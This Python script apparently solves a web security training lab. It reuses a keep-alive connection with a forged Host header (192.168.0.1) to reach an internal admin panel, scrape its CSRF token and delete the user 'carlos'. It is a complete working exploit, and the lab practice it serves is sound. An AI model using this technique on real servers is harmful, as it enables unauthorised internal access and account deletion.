import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import http.client, ssl

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def send_absolute_req(c, url, path, host_header, cookies={}, method='GET', body=None):
    target_url = url + path
    if method == 'GET' and body:
        target_url += f'?{body}'
    cookies_str = '; '.join(f'{k}={v}' for k, v in cookies.items())

    c.putrequest(method, target_url, skip_host=True, skip_accept_encoding=True)
    c.putheader('Host', host_header)
    c.putheader('Cookie', cookies_str)
    c.putheader('Connection', 'keep-alive')
    if method == 'POST' and body:
        c.putheader('Content-Type', 'application/x-www-form-urlencoded')
        c.putheader('Content-Length', str(len(body)))
    c.endheaders()
    if method == 'POST' and body:
        c.send(body.encode())
    r = c.getresponse()
    body = r.read().decode(errors='replace')
    
    return r.status, body

def extract_csrf_token(text):
    soup = BeautifulSoup(text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value'] # type: ignore
    return csrf

def goto(s, url, path, headers={}, cookies={}):
    target_url = url + path
    s.get(target_url, headers=headers, cookies=cookies)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    # s.proxies=proxies
    # s.verify = False
    url = sys.argv[1].rstrip('/') 

    c = http.client.HTTPSConnection(url.split('://')[-1], 443, context=ssl._create_unverified_context())
    target_user = 'carlos'
    internal_network = '192.168.0.1'

    goto(s, url, '/')
    session_cookies = s.cookies.get_dict()

    send_absolute_req(c, url, '/', url.split('://')[-1], session_cookies)
    _, response = send_absolute_req(c, url, '/admin', internal_network, session_cookies)
    
    csrf_token = extract_csrf_token(response)
    body = f'username={target_user}&csrf={csrf_token}'

    _, response = send_absolute_req(c, url, '/admin/delete', internal_network, session_cookies, 'POST', body)

    check_solved_lab(s, url)

if __name__ == '__main__':
    main()